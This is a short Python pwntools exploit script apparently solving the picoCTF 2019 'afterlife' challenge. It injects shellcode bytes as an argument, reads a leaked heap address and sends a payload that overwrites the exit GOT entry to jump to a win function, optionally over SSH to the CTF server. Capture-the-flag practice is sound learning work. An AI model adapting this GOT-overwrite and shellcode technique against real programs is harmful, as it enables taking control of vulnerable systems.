#!/usr/bin/env python

from pwn import *
import sys
argv = sys.argv

e = ELF('./vuln')
win = e.symbols['win']
puts_plt = e.symbols['puts']
exit_got = e.got['exit']
main = e.symbols['main']
while True:
	try:
		if len(argv)>1:
			from getpass import getpass
			ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
			p = ssh.process(['./vuln', 'A'*12+'\x68\x66\x89\x04\x08\xc3\x90'], cwd='/problems/afterlife_0_e6b92a146adf0d12b3a84517cdda985f')
		else:
			p = process(['./vuln', 'A'*12+'\x68\x66\x89\x04\x08\xc3\x90'])
		p.recvuntil('...\n')
		leak = int(p.recvline())
		print "Leak: "+hex(leak)
		payload = ''
		payload+= p32(exit_got)
		payload+= p32(leak)
		p.sendline(payload)
		print p.recvuntil('}')
		p.close()
		break
	except:
		pass